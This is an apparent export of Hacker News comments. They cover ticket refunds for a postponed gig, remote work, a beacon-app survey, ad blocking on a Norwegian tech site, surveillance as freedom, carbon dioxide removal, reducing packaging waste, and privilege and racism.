The gig was postponed at a late stage, for a year, and the options were:<p>1) get a refund, lose the ticket you&#x27;d been lucky to get at face value back into the pool, probably never to be seen again for the same price.
2) hold onto your ticket, wait a year, go see the gig<p>It therefore resulted in $millions being held by the organisers for over a year - there are extremely low risk ways to gain a meaningful profit from a large amount of capital. Intentionally or not, and whether or not it was invested by them during that year, this situation turned out to be a great way to get a huge, zero-interest loan of said capital.<p>I&#x27;m not sure if there are laws that prevent this kind of thing from happening, but it&#x27;s certainly easy money in theory.",1438649994

I think most good organizations make remote work an exception rather than the rule.<p>I think the reason is because very few people are able to manage the trials of working for a large organization and work remote. It involves being able to distinguish between when to converse via the written text and when to get ready to jump on a call or talk face to face. Consequently, it also imposes an overhead on the part of the non-remote team to assiduously convert all in-person/ad hoc conversations into text and loop the remote person in.<p>It also sometimes necessitates a person who is able to be high functioning and effectively independent of the rest of the team.<p>Now in cases where both of these are possible, I can imagine a startup letting some people do remote. Personally, I would think of this as an unnecessary overhead if I were to start an early stage startup.",1438649977

We&#x27;re aware that to build an beacon focused app sometimes you struggle to find the use case, and that&#x27;s why we build proxitee with the ability to plug into an existing app. Which means you can build your killer app + enhance it by making it location aware.<p>A few questions.
1. Have you built any location aware apps and if YES what hardware and platform (if any) did you use ? Any good and/or bad things to point out?
2. Are you planning on building any location aware apps in the next 3 months?
3. Would you prefer using this as a SAAS platform or Packaged and self hosted.
4. Would you prefer a fixed monthly fee or a per interaction based model?<p>Thanks in advance and if you have an interesting project that needs location awareness in it - drop me a line.<p>Thx

Their writers are crap compared to something like Anadtech, and they mostly aggregate/regurgitate tech news, like most aggreagation sites -- adding little value (well, to anyone that reads English, which is pretty much anyone interested in the subject matter in Norway, with the possible exception of very young gamers).<p>They used to be one of the few sites I&#x27;d occasionally click through on ads -- hw.no (a hardware reviews site, reviews in their only &quot;original&quot; content -- and while not as good as dpreview/anadtech etc -- sometimes worth reading) had very well targeted ads: your read about hardware, Norwegian companies advertise hw for sale. Obvious match.<p>Then, due to the web being the web, I started using an ad-blocker -- partly to get rid of ads (gets in the way of reading, ie: gets in the way of the value the web provides me) -- and mostly as an anti-virus/malware thing.<p><i>Then</i> tek.no launched a &quot;premium&quot; service, and started blocking access to those using adblock -- showing a &quot;please enable ads or subscribe to read without ads&quot; pop-up. Perfectly fine. I now rarely read tek.no -- their product isn&#x27;t good enough that it&#x27;s worth anything to me. That might change if there was a viable micro-payment solution -- but just the effort of subscribing (ignoring the actual cost) is too high a price for me to pay for their content.<p>The <i>real</i> question, is would I pay for other content? There are a couple of newspapers I might consider subscribing to -- some Norwegian, and eg: The Washington Post, The New York Times, The Guardian -- but generally I&#x27;m not convinced any of them have a good (enough) digital product.<p>I&#x27;d want a) no ads, b) no tracking, c) no pdf/rich-media crap, d) no drm, decent RSS support and off-line reading (epub might be a great choice of format, or &quot;least worst&quot;) c) decent typography (hello: CSS3:  p { hyphens: auto }).<p>Does anyone know of anyone that provides this? LWN is probably the closest I know of -- and at the top of my list of &quot;subscription todos&quot;. If they had more content, and more stuff along the lines of Dr. Dobbs and Byte, I&#x27;d probably have already subscribed -- but I assume that&#x27;d demand at least a doubling in price (which would be fine by me).<p>[ed: as for tracking -- it makes no sense to have an opt-out standard. An opt-in standard might make sense -- but that&#x27;d probably just mean the end of (legal) tracking -- who&#x27;d really want to opt-in?]",1438649846

Freedom from observation is not freedom, freedom from incorrect enforcement is freedom.<p>Observation does not alter the moral scope of the individual, or the moral scope of the society. The individual&#x27;s choice to limit their own moral scope under observation is what limits their scope. Surveillance does not affect the effective moral scope. Enforcement defines the ( effective ) moral scope ( the scope of actions that individuals can do without expecting hindrance from society ).<p>More comprehensive surveillance, leads to more clear enforcement, and more clear enforcement preserves in clearer definition those freedoms which are expressly not prohibited under the moral scope of a society. Surveillance is a tool of freedom. Specifically, a tool that contributes to preserving the freedom of action of individuals by contributing to more effective enforcement.<p>Without surveillance the machinery of enforcement can be more messily and liberally applied.<p>The fake left doctrines complain about surveillance as a tool of oppression.<p>Surveillance is seen in fact a tool of freedom, it is the light shone upon. The fake left doctrine has framed the entire debate incorrectly. Absence of surveillance is not a civil freedom, it is in fact an assurance of imprecisely applied enforcement.<p>Surveillance is a civil freedom.<p>Lawful enforcement is a civil freedom.<p>The remaining civil freedoms, known as &quot;civil liberties&quot; are those things permitted by an individual&#x27;s effective moral scope.<p>Civil liberties, like morals in general, are not absolute, they are the choices made by societies to define themselves at a particular time and place. ( The color of absolutism is invoked because that promotes harmony -- if something is absolute it is beyond question. This is not a real admission of absolute, simply a shorthand for a society saying the debate about this way we define ourselves is complete, for now. )<p>Civil freedoms are distinguished from civil liberties in that civil freedoms include those acts, two of which are defined above, which effect whatever civil liberties are chosen. Civil freedoms include the machinery of creation of civil liberties.<p>The relationship between the state and the individual is somewhat akin to that between a parent and a baby. A baby is many things, and it is also helpless and chaotic without the governance of the parent. The parent&#x27;s attentive observation ( surveillance ) of the baby presents the baby from harming itself. The state&#x27;s attentive surveillance of the individuals presents them from harming themselves and others.<p>If large groups of individuals were capable of governing themselves in an ad-hoc fashion then...the internet, reddit, all of these places would be domains of inclusion, tolerance, peace, and respect. In fact, moderators, and moderators of moderators, and policies, and a central authority are required to prevent chaos and harm.<p>These things ( observations and controls -- surveillance and enforcement ) are the very enablers of the same liberties that 
the fake left doctrine purports they destroy.<p>The fake left doctrines complain about surveillance as a tool of oppression. They use &quot;freedom&quot; in an intangible, absolute sense. A mythological &quot;Perfect Freedom of the Individual&quot;, a delusion that fails to acknowledge the social context in which any freedom of action exists.<p>These fake left doctrines are founded on a delusion of a freedom unhindered by a social context. They are the fake left&#x27;s dream of the mythical Powerful Individual, a delusion to compensate for the collective belief of the fake left of the powerlessness of the individual against some mythical oppressive force. In fact, for an individual exposed only to lawful restriction of their action, their only powerlessness is their fabrication of their own powerlessness.<p>The mythical oppressor of the fake left is in fact, not the lawful surveillance state, it is the individual that chooses to believe itself powerless. Surveillance is not oppression, incorrectly applied enforcement is the very definition of oppression. And as the net of surveillance is narrowed, a broader net of enforcement must be cast to protect individuals from themselves. The fundamental that the fake left has not grasped is that the trade off is not between &quot;broader freedoms and broader surveillance&quot; it is between &quot;broader surveillance or broader enforcement&quot;, and broader enforcement, without the information, is going to be incorrectly applied.",1438648233

10000841,comment,10000829,10000829,0,0,spenrose,,,"&quot;The Intergovernmental Panel on Climate Change concluded last year that reaching a key emissions goal—roughly equivalent to limiting warming to 2°C by 2100—would rely on the deployment of one or several CDR technologies. Deploying them could cost more than a trillion dollars, one expert estimates.<p>The new study puts the concept of CDR to the test—without getting into the specifics of which technology to use. The authors used computer simulations to figure out what would happen if engineers removed a whopping 5 gigatons of carbon dioxide from the atmosphere each year. Achieving that goal, equivalent to removing roughly half the amount of CO2 that is now emitted from manmade sources, would require a gargantuan global effort. (To visualize the scale, imagine 5000 new facilities each roughly the size of a sports stadium.)<p>Yet the scientists found the environmental benefits of such a massive technological campaign were surprisingly small, especially in terms of protecting the ocean from the impacts of climate change. One key impact of rising CO2 levels is seen in the pH of ocean waters—the global sea surface has been acidified by roughly 0.1 units and impacts on marine shells are beginning to show. But the experiment demonstrated that the CDR campaign had only limited effect to reverse that trend: Without the CDR the surface pH was reduced by 0.75 units by 2200; with CDR the acidification was reduced 0.7 units, the team reports online today in Nature Climate Change.&quot;",1438647192

10000838,comment,9998912,10000129,0,0,yourapostasy,,,"I have found trying to reduce packaging and reuse containers rather difficult. If manufacturers and retailers cooperate to offer bulk product pricing for customers who reuse containers and thus reduce the significant packaging costs of retail quantities/products, I would be one of the (few?) target consumers who take advantage of that. I already try to do so, but I found significant frictional costs in my attempts. A couple examples of those costs.<p>* Many checkout clerks are not familiar with properly keying in a package tare weight. This is a problem when you bring your own packaging when purchasing bulk. This is compounded when you already have some residual amount in the packaging, and want to convey the tare of the combined weight. The result is you increase the complexity of your at-home handling of packages (you have to set aside temporary space and containers for the residual amounts so your packages are empty at the store), and there is significant time at the check out for clerks looking up/asking others how to set a tare, and/or you go to customer service to correct improperly keyed-in tare values (or no tare values at all), even after politely asking the check out clerks if they would prefer you go to another line/clerk to handle the tare data. This even happens to me at supposedly highly-trained vendors like Whole Foods Market.<p>* Manufacturers are simply not equipped to handle consumers who want to purchase one single unit of a large quantity of product, over and over, year after year. For example, a 5 gal carboy of Dr. Bronner&#x27;s soap straight from the manufacturer costs about the same as the equivalent quantity 5, 1 gal jugs from the retail store, after accounting for shipping and handling and sales taxes, respectively. That&#x27;s fine, except those carboys are not cheap, and there simply isn&#x27;t an option to purchase refills that ship in heavy duty collapsible plastic bags (shipped in heavy cardboard), not to speak of sending those refills back to the manufacturer. I&#x27;d love to get refills like that for my staple items, in highly-generic and reusable containers, instead of always sending containers to the recycling plant. I&#x27;m constantly amazed how prolifically we use disposable plastic packaging, when in those applications where it spends most of its lifecycle away from UV exposure, it is an extraordinarily durable material.<p>From a cultural perspective, I completely understand: I&#x27;m a very remote outlier consumer, and there are likely only a few thousand world wide who share my outlook and are are willing to go to some lengths to reduce how much I feed into the recycling and waste streams. My philosophy is that waste is a material expression of our lack of knowledge of how to usefully transform the embodied energy of the waste into something else we want to use, and the less waste and even recycling activity we perform, the more overall efficient we are.",1438647151

In other words, racism isn&#x27;t simply about race, per se. It&#x27;s about power, and specifically power with long-standing support in the customs, laws, and economies of the racist society.<p>Taking steps to reject that power and the systems that maintain it inevitably means treating people of one race in a way that&#x27;s different from the way they&#x27;ve been treated to date. A policy that says &quot;we&#x27;re not going to respect your privilege&quot; is obviously not going to treat everybody equally since not everybody had privilege to begin with. However, it does tend towards a point where, in the absence of engrained racial privilege, a more egalitarian society can emerge.<p>If you&#x27;re a decent human being who has privilege but doesn&#x27;t rely on it, that&#x27;s a positive development.

10000788,comment,10000563,10000563,0,0,alexqgb,,,"Their reasoning seems pretty clear &quot;Our open source community prioritizes marginalized people’s safety over privileged people’s comfort.&quot;<p>It&#x27;s worth noting that &quot;privilege&quot; comes from the Latin for &quot;private law&quot;, which is to say a law that established a code of conduct for one class that was not applied to another. Typically, this took the form of exempting some people from the laws that bound everyone else.<p>In other words, the life under conditions of privilege was far freer and and more forgiving than it was for everyone else. The result was a set of advantages that made it easy for those with privilege to maintain it, and difficult for those without privilege to acquire it.<p>What&#x27;s remarkable about this document is the way it illuminates the extraordinary number and range of ways in which privilege - and its attendant social ordering functions - can express itself. In other words, simply countering it, to say nothing of dismantling it, is a non-trivial task.<p>Understanding privilege in this way also makes it easy to see why the very concept of &quot;reverse racism&quot; is so ridiculous. In essence, it&#x27;s based on a profound misunderstanding of what racism is in the first place. It is not simply a matter of treating different people differently. It is about embedding race in a system of privilege, which is something you cannot do unless you have privilege in the first place (obviously, allowing those without privilege to define its benefits would defeat the whole purpose). In other words, racism is about propagating a deeply established social hierarchy of dominance and submission that is based on race. To the extent that &quot;reverse racism&quot; seeks to limit the power of these structures, it&#x27;s a good thing. In any case, the problem is the continued existence of the unjust power structure, and not the fact that people pay attention to who does and does not receive its protection.<p>In Western countries, privilege has generally meant straight, white, men, from well-off backgrounds making life much easier for each other while making it much more difficult for everyone else. Sure, there are exceptions. But they&#x27;re few and far between, with their scarcity only serving to underscore the general rule. And while plenty of individuals who are a part of this class may find the structure distasteful, that&#x27;s had limited effect on the structure itself, which remains largely dominant to this day.<p>In any case, it&#x27;s not going to dismantle itself, so it&#x27;s up to the people who do want to do something about it to actually <i>do</i> something about it. Saying &quot;we&#x27;re not going to defend it, and given a choice, we&#x27;re going to rule against it&quot; is a good example.<p>That may be very unsettling for some people, but understand this: if you&#x27;re getting grief the problem is probably not that you&#x27;re a straight, white guy. More likely, the problem is that you&#x27;re treating other people like garbage in more ways than you can even imagine, and doing so habitually because your privilege allows you to get away with it.<p>And yes, a place that explicitly says &quot;your privilege is not respected here&quot; can be a tricky one for some people to navigate. If you&#x27;re not much of a jerk to begin with, it isn&#x27;t a big deal. But if you&#x27;re a deep-fried, hard-boiled asshole who cannot even <i>imagine</i> how to treat others with a suitable measure of civility and respect, yes, you&#x27;re going to suffer.",1438646640
